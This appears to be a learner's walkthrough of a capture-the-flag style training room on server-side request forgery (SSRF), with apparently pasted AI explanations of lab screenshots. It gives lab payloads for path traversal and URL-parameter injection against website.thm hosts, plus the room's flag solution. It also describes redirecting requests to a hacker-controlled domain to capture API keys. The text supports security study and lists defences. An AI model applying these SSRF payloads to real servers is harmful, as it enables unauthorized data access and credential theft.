# Walkthroug
Room Brief

In this room, you'll learn what an SSRF is, what kind of impact they can have, you'll view some example SSRF attacks, how you can discover SSRF vulnerabilities, how to circumvent input rules and then we have a practice for you against with to try your newfound skills.


What is an SSRF?

SSRF stands for Server-Side Request Forgery. It's a vulnerability that allows a malicious user to cause the webserver to make an additional or edited HTTP request to the resource of the attacker's choosing.


Types of SSRF

There are two types of SSRF vulnerability; the first is a regular SSRF where data is returned to the attacker's screen. The second is a Blind SSRF vulnerability where an SSRF occurs, but no information is returned to the attacker's screen.
What's the impact?

A successful SSRF attack can result in any of the following: 

    Access to unauthorised areas.
    Access to customer/organisational data.
    Ability to Scale to internal networks.
    Reveal authentication tokens/credentials.

    
    
<img width="773" height="742" alt="image" src="https://github.com/user-attachments/assets/785dd661-9543-47aa-bc4d-0e33859b1980" />


Expected behavior (Expected Request): The website.thm server has the function of checking the remaining goods. It takes the url parameter and accesses the internal API: http://website.thm/stock?url=/item?id=123 In a normal situation, the server adds this URL to the API path, getting something like: http://api.website.thm/api/stock/item?id=123 .

Hacker's actions (Step 1): Instead of the product ID, the hacker enters special characters to go to the directory above: ../. The request looks like this: http://website.thm/stock?url=../../user

Server logic error (Step 2): The website.thm server takes this input and generates an internal API request: http://api.website.thm/api/stock/../../user Because of the ../ (Directory Traversal) characters, the path "rises" higher, removing the /api/stock/ segments. As a result, the request turns into: http://api.website.thm/user

Data Leakage (Steps 3 and 4):

    The API server sees the request to /user (where the users' personal data may be) and returns it, as it believes that the request came from a trusted "own" server.

    The main server receives this data and simply forwards it to the hacker.



<img width="849" height="508" alt="image" src="https://github.com/user-attachments/assets/93e00c59-06d5-4c21-9e60-91b9e7fa8644" />


Explain

    Query successful

This screenshot explains the concept of SSRF (Server-Side Request Forgery) in combination with Directory Traversal (directory traversal).

The essence of the attack is that the hacker forces the server to make a request to an address that the hacker himself does not have direct access to.
How it works (step by step):

    Expected behavior (Expected Request): The website.thm server has the function of checking the remaining goods. It takes the url parameter and accesses the internal API: http://website.thm/stock?url=/item?id=123 In a normal situation, the server adds this URL to the API path, getting something like: http://api.website.thm/api/stock/item?id=123 .

    Hacker's actions (Step 1): Instead of the product ID, the hacker enters special characters to go to the directory above: ../. The request looks like this: http://website.thm/stock?url=../../user

    Server logic error (Step 2): The website.thm server takes this input and generates an internal API request: http://api.website.thm/api/stock/../../user Because of the ../ (Directory Traversal) characters, the path "rises" higher, removing the /api/stock/ segments. As a result, the request turns into: http://api.website.thm/user

    Data Leakage (Steps 3 and 4):

        The API server sees the request to /user (where the users' personal data may be) and returns it, as it believes that the request came from a trusted "own" server.

        The main server receives this data and simply forwards it to the hacker.

Why is it dangerous?

    Bypassing protection: A hacker cannot directly access the api.website.thm/user (it is closed from the outside), but he uses the main site as a "proxy".

    Trust: Internal APIs are often less secure because developers think that only their own servers have access to them.

How can this be prevented?

    Input validation: Prevent the user from entering characters. and / in the URL parameters.

    White lists: Allow requests only to specific, pre-defined API endpoints.

    Isolation: Configure the API so that it requires authorization even for internal requests.

Would you like me to explain in more detail exactly how the ../ characters manipulate the path in the URL?

Explain it

    Query successful

This image shows another example of an SSRF (Server-Side Request Forgery) attack, but this time the attacker uses URL parameter manipulation to trick the server into accessing a protected resource.

In this scheme, the attack is based on how a website glues together parts of a URL before sending a request to an internal API server.
Analysis of the attack stages

    Expected behavior (Expected Request)

        In a normal situation, the site is waiting for a request: http://website.thm/stock?server=api&id=123 .

        The server takes the api value, adds the domain and path to it, forming an internal request to receive product data.

    Hacker's Actions (Step 1)

        The hacker sends a modified server parameter. Instead of a simple server name, it enters a whole path with parameters: api.website.thm/api/user?x=.

        The hacker's full request looks like this: http://website.thm/stock?server=api.website.thm/api/user?x=&id=123.

    Creating a malicious request (Step 2)

        Website.thm takes the hacker's input and inserts it into its URL generation logic.

        Because the hacker added a symbol?x=, the rest of the original query (which was supposed to be the path to the product data) turns into the harmless parameter x.

        As a result, the site makes an internal request to: http://api.website.thm/api/user?x=.website.thm/api/stock/item?id=123 .

        Result: Does the API server ignore everything that comes after ?x=, and opens the /api/user page.

    Data Leakage (Steps 3 and 4)

        The API server returns confidential user data to the website.thm server.

        The website, believing that this is a regular response about the availability of goods, forwards this data to the hacker.


<img width="860" height="762" alt="image" src="https://github.com/user-attachments/assets/e9362929-5b23-4a11-98d3-11faeb9608e2" />
Interception of credentials (Exfiltration)

The second screenshot (image_c04d8f.png) shows a strategy in which a hacker forces the server to send a request to a domain controlled by the hacker.

    How it works: The attacker changes the target URL to his own server: url=http://hacker-domain.thm/.

    What is the value for a hacker: When the website.thm server makes a request to the hacker, it can automatically include authorization headers or API keys in it, which it usually uses to communicate with the internal api of website.thm.

    The result: The hacker simply logs the incoming request on his server and receives a valid API key or token, with which he can then legally log in to the system.
<img width="860" height="762" alt="image" src="https://github.com/user-attachments/assets/4700b5af-0a57-4250-be71-d924314212ff" />
Using what you've learnt, try changing the address in the browser below to force the webserver to return data from https://server.website.thm/flag?id=9. To make things easier the Server Requesting bar at the bottom of the mock browser will show the URL that website.thm is requesting. 
I used https://website.thm/item/2?server=api and added https://website.thm/item/2?server=server.website.thm/flag?id=9&x= and this SSRF working !


More security-savvy developers aware of the risks of SSRF vulnerabilities may implement checks in their applications to make sure the requested resource meets specific rules. There are usually two approaches to this, either a deny list or an allow list

# Challenge 
*In challenge I used value in selection avatar feature.
through value I could to go in private writing this sentence "x/../private" ../ it is like cd to next directory and skip this directory without checking rights
That's all
